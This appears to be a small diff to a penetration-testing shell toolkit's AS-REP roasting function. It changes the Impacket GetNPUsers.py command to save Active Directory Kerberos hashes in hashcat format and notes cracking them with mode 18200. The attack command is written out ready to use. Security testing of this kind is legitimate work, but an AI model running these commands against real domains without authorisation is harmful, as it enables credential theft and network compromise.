@@ -81,7 +81,7 @@ nb-ad-kerb-asreproast() {
 	__ask "Enter a users wordlist"
   __askpath ul FILE $HOME/desktop/projects/
 
-	print -z "GetNPUsers.py -dc-ip ${__RHOST} ${__DOMAIN}/ -no-pass -usersfile $ul | tee $(__domadpath)/GetNPUsers.txt"
+	print -z "GetNPUsers.py -dc-ip ${__RHOST} ${__DOMAIN}/ -no-pass -usersfile $ul -format hashcat -outputfile $(__domadpath)/asrep-hashes.txt"
 
-  __info "You can then crack this hash with mode '18200' using 'nb-crack-list'"
+  __info "You can now crack this hash with mode '18200' using 'nb-crack-list'"
 }
